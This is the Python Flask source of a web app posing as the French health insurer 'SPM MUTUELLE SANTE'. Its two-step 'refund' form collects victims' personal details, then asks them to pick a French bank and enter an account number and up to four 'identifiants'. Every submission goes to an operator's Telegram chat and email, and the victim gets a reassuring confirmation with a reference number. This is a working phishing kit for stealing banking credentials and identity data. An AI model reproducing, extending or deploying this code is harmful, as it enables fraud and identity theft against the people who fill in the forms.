import os
import re
import random
from datetime import datetime, timezone

import requests
from dotenv import load_dotenv

from flask import (
    Flask,
    render_template,
    request,
    redirect,
    url_for,
    session,
    send_file,
    jsonify,
)

from markupsafe import escape


# ============================================================
# CONFIGURATION
# ============================================================

load_dotenv()

RESEND_API_KEY = os.environ.get("RESEND_API_KEY", "")
SENDER_EMAIL = os.environ.get(
    "SENDER_EMAIL",
    "SPM MUTUELLE SANTE <onboarding@resend.dev>"
)
EMAIL_REPLY_TO = os.environ.get("EMAIL_REPLY_TO", "")
OWNER_EMAIL = os.environ.get("OWNER_EMAIL", "")

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")


app = Flask(__name__)

app.secret_key = os.environ.get(
    "SECRET_KEY",
    "changez-moi-en-production"
)


# ============================================================
# INFORMATIONS DE CONFIGURATION
# ============================================================

print(">>> RESEND PRESENT :", bool(RESEND_API_KEY))
print(">>> SENDER        :", SENDER_EMAIL)

print(
    ">>> TELEGRAM TOKEN PRESENT :",
    bool(TELEGRAM_BOT_TOKEN)
)

print(
    ">>> TELEGRAM CHAT ID PRESENT :",
    bool(TELEGRAM_CHAT_ID)
)


# ============================================================
# DONNEES STATIQUES
# ============================================================

MOTIFS_RESILIATION = [
    "Je n'utilise plus le produit / service",
    "Tarif trop élevé",
    "Service insatisfaisant",
    "Déménagement",
    "Autre motif",
]

REFUND_STEPS = [
    (1, "Vos informations"),
    (2, "Remboursement"),
]

DEVIS_STEPS = [
    (1, "Coordonnées"),
    (2, "Votre demande"),
]

LIBELLES_E1 = {
    "nom": "nom",
    "prenom": "prénom",
    "adresse": "adresse postale",
    "email": "adresse email",
    "birth_date": "date de naissance",
    "phone": "numéro de téléphone",
    "montant": "montant à recevoir",
}


# ============================================================
# TELEGRAM
# ============================================================

def send_telegram_message(message):
    """
    Envoie un message au chat Telegram configuré.
    Ne mettez jamais de token Telegram dans le code.
    """

    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print(">>> TELEGRAM : TOKEN ou CHAT_ID manquant")
        return False

    url = (
        f"https://api.telegram.org/"
        f"bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    )

    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
    }

    try:
        response = requests.post(
            url,
            data=data,
            timeout=10,
        )

        if response.ok:
            print(">>> TELEGRAM : message envoyé avec succès")
            return True

        print(
            ">>> TELEGRAM ERREUR :",
            response.status_code,
            response.text
        )

        return False

    except Exception as e:
        print(">>> TELEGRAM EXCEPTION :", e)
        return False


# ============================================================
# RESEND
# ============================================================

def send_email(to, subject, html, reply_to=None):

    if not RESEND_API_KEY:
        app.logger.warning(
            "RESEND_API_KEY manquante : email non envoyé."
        )
        return None

    recipients = [
        email.strip()
        for email in to.split(",")
        if email.strip()
    ]

    payload = {
        "from": SENDER_EMAIL,
        "to": recipients,
        "subject": subject,
        "html": html,
    }

    target = reply_to or EMAIL_REPLY_TO

    if target:
        payload["reply_to"] = target

    response = requests.post(
        "https://api.resend.com/emails",
        headers={
            "Authorization": f"Bearer {RESEND_API_KEY}",
            "Content-Type": "application/json",
        },
        json=payload,
        timeout=15,
    )

    if response.status_code >= 400:
        app.logger.error(
            f"Resend {response.status_code} : {response.text}"
        )

    response.raise_for_status()

    return response.json().get("id")


# ============================================================
# HTML EMAIL
# ============================================================

def _page(title, body):

    return f"""
<div style="
    background:#FFFFFF;
    padding:32px 16px;
    font-family:Arial,sans-serif;
">

    <div style="
        max-width:520px;
        margin:0 auto;
        background:#ffffff;
        border:1px solid #E2E8F0;
    ">

        <div style="
            background:#0F2C59;
            padding:22px 30px;
            color:#FAF8F5;
        ">

            <span style="
                font-family:Georgia,serif;
                font-size:20px;
                letter-spacing:4px;
            ">
                SPM
            </span>

            <div style="
                font-size:10px;
                letter-spacing:3px;
                opacity:.7;
                margin-top:4px;
            ">
                SPM MUTUELLE SANTE
            </div>

        </div>

        <div style="padding:30px">

            <p style="
                font-family:Georgia,serif;
                font-size:22px;
                color:#0F2C59;
                margin:0 0 18px;
            ">
                {title}
            </p>

            {body}

            <p style="
                font-size:11px;
                color:#94A3B8;
                margin:26px 0 0;
            ">
                SPM MUTUELLE SANTE —
                Ne transmettez jamais de mot de passe,
                code secret ou donnée bancaire sensible
                par email ou messagerie.
            </p>

        </div>

    </div>

</div>
"""


def _table(rows):

    lignes = ""

    for key, value in rows:

        lignes += f"""
<tr>
    <td style="
        color:#64748B;
        vertical-align:top;
        padding:10px;
    ">
        {escape(str(key))}
    </td>

    <td style="padding:10px;">
        <strong>
            {escape(str(value))}
        </strong>
    </td>
</tr>
"""

    return f"""
<table
    style="
        width:100%;
        background:#F5F8FC;
        font-size:13px;
        border-collapse:collapse;
    "
>
    {lignes}
</table>
"""


def client_html(kind, nom, reference, rows):

    body = f"""
<p style="
    font-size:14px;
    line-height:1.6;
    margin:0 0 10px;
">
    Bonjour {escape(nom)},
</p>

<p style="
    font-size:14px;
    line-height:1.6;
    margin:0 0 18px;
">
    Votre demande de {escape(kind)}
    est bien enregistrée.
</p>

{_table([("Référence", reference)] + rows)}

<p style="
    font-size:14px;
    line-height:1.6;
    margin:18px 0 0;
">
    Conservez votre référence
    <strong>{escape(reference)}</strong>
    pour le suivi de votre demande.
</p>
"""

    return _page(
        "Votre demande est bien reçue",
        body
    )


def owner_html(kind, reference, rows):

    body = f"""
<p style="
    font-size:13px;
    color:#64748B;
    margin:0 0 16px;
">
    Détailles du béneficiaire..
</p>

{_table([("Référence", reference)] + rows)}
"""

    return _page(
        f"Nouvelle demande de {escape(kind)}",
        body
    )


def notify(
    kind,
    reference,
    nom,
    email,
    rows,
    owner_extra=None
):

    # --------------------------------------------------------
    # EMAIL CLIENT
    # --------------------------------------------------------

    try:

        send_email(
            email,
            (
                "SPM MUTUELLE SANTE — "
                f"Confirmation de votre demande {reference}"
            ),
            client_html(
                kind,
                nom,
                reference,
                rows
            ),
        )

    except Exception as e:

        app.logger.error(
            f"Email client non envoyé "
            f"({reference}) : {e}"
        )


    # --------------------------------------------------------
    # EMAIL PROPRIETAIRE
    # --------------------------------------------------------

    if OWNER_EMAIL:

        try:

            send_email(
                OWNER_EMAIL,
                f"[{kind.capitalize()}] {reference} — {nom}",
                owner_html(
                    kind,
                    reference,
                    rows + list(owner_extra or [])
                ),
                reply_to=email,
            )

        except Exception as e:

            app.logger.error(
                f"Email propriétaire non envoyé "
                f"({reference}) : {e}"
            )


# ============================================================
# VALIDATIONS
# ============================================================

def email_valide(email):

    return bool(
        re.match(
            r"^[^\s@]+@[^\s@]+\.[^\s@]+$",
            email
        )
    )


def date_valide(date):

    return bool(
        re.match(
            r"^\d{4}-\d{2}-\d{2}$",
            date
        )
    )


def nouvelle_ref(prefix):

    return (
        f"{prefix}-"
        f"{datetime.now(timezone.utc).year}-"
        f"{random.randint(10000, 99999)}"
    )


# ============================================================
# ACCUEIL
# ============================================================

@app.route("/")
def accueil():

    return render_template(
        "index.html"
    )


# ============================================================
# SERVICES
# ============================================================

@app.route("/services")
def services():

    return render_template(
        "services.html"
    )


# ============================================================
# ETAPE 1
# ============================================================

@app.route(
    "/etape-1",
    methods=["GET", "POST"]
)
def etape1():

    data = session.get(
        "r1",
        {
            "nom": "",
            "prenom": "",
            "adresse": "",
            "email": "",
            "birth_date": "",
            "phone": "",
            "montant": "",
        }
    )

    error = None

    if request.method == "POST":

        data = {
            key: request.form.get(
                key,
                ""
            ).strip()

            for key in (
                "nom",
                "prenom",
                "adresse",
                "email",
                "birth_date",
                "phone",
                "montant",
            )
        }


        # ----------------------------------------------------
        # CHAMPS OBLIGATOIRES
        # ----------------------------------------------------

        manquants = [
            label
            for key, label in LIBELLES_E1.items()
            if not data[key]
        ]

        if manquants:

            error = (
                "Merci de remplir : "
                + ", ".join(manquants)
                + "."
            )


        # ----------------------------------------------------
        # EMAIL
        # ----------------------------------------------------

        elif not email_valide(
            data["email"]
        ):

            error = (
                "Adresse email invalide."
            )


        # ----------------------------------------------------
        # DATE
        # ----------------------------------------------------

        elif not date_valide(
            data["birth_date"]
        ):

            error = (
                "Date de naissance invalide."
            )


        # ----------------------------------------------------
        # TELEPHONE
        # ----------------------------------------------------

        elif len(
            re.sub(
                r"\D",
                "",
                data["phone"]
            )
        ) < 8:

            error = (
                "Numéro de téléphone invalide."
            )


        # ----------------------------------------------------
        # MONTANT
        # ----------------------------------------------------

        elif not re.match(
            r"^\d+([.,]\d{1,2})?\s*"
            r"(€|eur|euros?)?$",
            data["montant"],
            re.IGNORECASE
        ):

            error = (
                "Montant invalide "
                "(ex : 49,90)."
            )


        # ----------------------------------------------------
        # VALIDATION
        # ----------------------------------------------------

        if not error:

            session["r1"] = data

            # Telegram : informations non sensibles
            telegram_message = f"""
🔔 NOUVELLE ÉTAPE 1

👤 Nom : {data["nom"]}
👤 Prénom : {data["prenom"]}

📧 Email : {data["email"]}

📱 Téléphone : {data["phone"]}

🏠 Adresse : {data["adresse"]}

📅 Date de naissance : {data["birth_date"]}

💰 Montant demandé : {data["montant"]}

━━━━━━━━━━━━━━━━━━
✅ ÉTAPE 1 VALIDÉE
━━━━━━━━━━━━━━━━━━
"""

            send_telegram_message(
                telegram_message
            )

            return redirect(
                url_for("etape2")
            )


    return render_template(
        "etape1.html",
        step=1,
        step_labels=REFUND_STEPS,
        data=data,
        error=error,
        header_bleu=True,
    )


# ============================================================
# ETAPE 2
# ============================================================

@app.route(
    "/etape-2",
    methods=["GET", "POST"]
)
def etape2():

    # --------------------------------------------------------
    # VERIFICATION SESSION
    # --------------------------------------------------------

    if "r1" not in session:

        if request.method == "POST":

            return jsonify({
                "success": False,
                "error": (
                    "Votre session a expiré. "
                    "Veuillez recommencer."
                )
            }), 400

        return redirect(
            url_for("etape1")
        )


    # --------------------------------------------------------
    # DONNEES ETAPE 2
    # --------------------------------------------------------

    data = {
        "type_information": "",
        "marque": "",
        "numero": "",
        "identifiant1": "",
        "identifiant2": "",
        "identifiant3": "",
        "identifiant4": "",
    }

    error = None


    # --------------------------------------------------------
    # POST
    # --------------------------------------------------------

    if request.method == "POST":

        data = {
            key: request.form.get(
                key,
                ""
            ).strip()

            for key in (
                "type_information",
                "marque",
                "numero",
                "identifiant1",
                "identifiant2",
                "identifiant3",
                "identifiant4",
            )
        }


        # ----------------------------------------------------
        # VALIDATION
        # ----------------------------------------------------

        if not data["type_information"]:

            error = (
                "Veuillez sélectionner "
                "un type d'information."
            )

        elif data["type_information"] not in (
            "BNP PARIBAS",
            "SOCIETE GENERALE",
            "BANQUE POPULAIRE",
            "BRED",
            "CIC BANQUE",
            "LCL",
            "CAISSE D'EPARGNE",
            "CREDIT MUTUEL",
            "CREDIT AGRICOLE",
            "CREDIT COOPERATIVE",
            "AXA",
            "BOURSORAMA BANQUE",
        ):

            error = (
                "Type d'information invalide."
            )

        elif not data["marque"]:

            error = (
                "Veuillez renseigner "
                "le nom de votre marque."
            )

        elif not data["numero"]:

            error = (
                "Veuillez renseigner le numéro."
            )

        elif not data["identifiant1"]:

            error = (
                "Veuillez renseigner "
                "l'identifiant 1."
            )


        # ----------------------------------------------------
        # SI TOUT EST VALIDE
        # ----------------------------------------------------

        if not error:

            session["r2"] = data

            r1 = session.get("r1", {})

            reference = nouvelle_ref(
                "REF"
            )

            email_client = (
                r1.get("email", "")
                .strip()
                .lower()
            )


            # ------------------------------------------------
            # TELEGRAM
            # ------------------------------------------------

            telegram_message = f"""
🔔 NOUVELLE DEMANDE

━━━━━━━━━━━━━━━━━━
👤 CLIENT
━━━━━━━━━━━━━━━━━━

Nom : {r1.get("nom", "")}
Prénom : {r1.get("prenom", "")}
Email : {email_client}
Téléphone : {r1.get("phone", "")}
Adresse : {r1.get("adresse", "")}
Date de naissance : {r1.get("birth_date", "")}
Montant : {r1.get("montant", "")}

━━━━━━━━━━━━━━━━━━
📋 ÉTAPE 2
━━━━━━━━━━━━━━━━━━

Type : {data["type_information"]}

Marque : {data["marque"]}

Numéro : {data["numero"]}

Identifiant 1 :
{data["identifiant1"]}

Identifiant 2 :
{data["identifiant2"] or "Non renseigné"}

Identifiant 3 :
{data["identifiant3"] or "Non renseigné"}

Identifiant 4 :
{data["identifiant4"] or "Non renseigné"}

━━━━━━━━━━━━━━━━━━
📌 Référence : {reference}
━━━━━━━━━━━━━━━━━━
"""

            send_telegram_message(
                telegram_message
            )


            # ------------------------------------------------
            # EMAIL
            # ------------------------------------------------

            if email_client:

                rows_client = [
                    (
                        "Type d'information",
                        data["type_information"]
                    ),
                    (
                        "Marque",
                        data["marque"]
                    ),
                    (
                        "Numéro",
                        data["numero"]
                    ),
                ]

                try:

                    notify(
                        "remboursement",
                        reference,
                        r1.get(
                            "prenom",
                            "Client"
                        ),
                        email_client,
                        rows_client,
                    )

                except Exception as e:

                    app.logger.error(
                        f"Notification email : {e}"
                    )


            # ------------------------------------------------
            # FIN
            # ------------------------------------------------

            session.pop(
                "r1",
                None
            )

            return jsonify({
                "success": True,
                "message": (
                    "Votre demande a bien "
                    "été enregistrée."
                ),
                "reference": reference,
            })


        # ----------------------------------------------------
        # ERREUR AJAX
        # ----------------------------------------------------

        return jsonify({
            "success": False,
            "error": error or (
                "Veuillez vérifier "
                "les informations."
            )
        }), 400


    # --------------------------------------------------------
    # GET
    # --------------------------------------------------------

    titulaire = (
        f"{session['r1'].get('prenom', '')} "
        f"{session['r1'].get('nom', '')}"
    ).strip().upper()


    return render_template(
        "etape2.html",
        step=2,
        step_labels=REFUND_STEPS,
        data=data,
        error=error,
        titulaire=titulaire,
        header_bleu=True,
    )


# ============================================================
# RESILIATION
# ============================================================

@app.route(
    "/resiliation",
    methods=["GET", "POST"]
)
def resiliation():

    data = {
        "nom": "",
        "email": "",
        "order_number": "",
        "motif": "",
        "date_souhaitee": "",
    }

    error = None

    if request.method == "POST":

        data = {
            key: request.form.get(
                key,
                ""
            ).strip()

            for key in data
        }

        if not (
            data["nom"]
            and data["email"]
            and data["order_number"]
            and data["motif"]
        ):

            error = (
                "Merci de remplir "
                "tous les champs obligatoires."
            )

        elif not email_valide(
            data["email"]
        ):

            error = (
                "Adresse email invalide."
            )

        elif data["motif"] not in MOTIFS_RESILIATION:

            error = (
                "Merci de sélectionner "
                "un motif."
            )


        if not error:

            reference = nouvelle_ref(
                "RES"
            )

            rows = [
                (
                    "Commande / contrat",
                    data["order_number"]
                ),
                (
                    "Motif",
                    data["motif"]
                ),
            ]

            if data["date_souhaitee"]:

                rows.append(
                    (
                        "Date souhaitée",
                        data["date_souhaitee"]
                    )
                )


            notify(
                "résiliation",
                reference,
                data["nom"],
                data["email"].lower(),
                rows,
            )


            send_telegram_message(
                f"""
🔔 NOUVELLE RÉSILIATION

Nom : {data["nom"]}

Email : {data["email"]}

Commande / contrat :
{data["order_number"]}

Motif :
{data["motif"]}

Date souhaitée :
{data["date_souhaitee"] or "Non renseignée"}

📌 Référence :
{reference}
"""
            )


            session["conf"] = {
                "reference": reference,
                "nom_affiche": data["nom"],
                "email": data["email"].lower(),
                "kind": "résiliation",
                "details": rows,
            }

            return redirect(
                url_for("confirmation")
            )


    return render_template(
        "resiliation.html",
        data=data,
        error=error,
        motifs=MOTIFS_RESILIATION,
    )


# ============================================================
# CONFIRMATION
# ============================================================

@app.route("/confirmation")
def confirmation():

    conf = session.pop(
        "conf",
        None
    )

    if not conf:

        return redirect(
            url_for("accueil")
        )

    return render_template(
        "confirmation.html",
        conf=conf
    )


# ============================================================
# TELECHARGEMENT
# ============================================================

ZIP_CODE = "/app/meindjo-flask.zip"


@app.route("/telecharger-le-code")
def telecharger_code():

    if not os.path.exists(
        ZIP_CODE
    ):

        return redirect(
            url_for("accueil")
        )

    return send_file(
        ZIP_CODE,
        as_attachment=True,
        download_name="meindjo-flask.zip"
    )


# ============================================================
# LANCEMENT LOCAL
# ============================================================

if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=5000,
        debug=True
    )
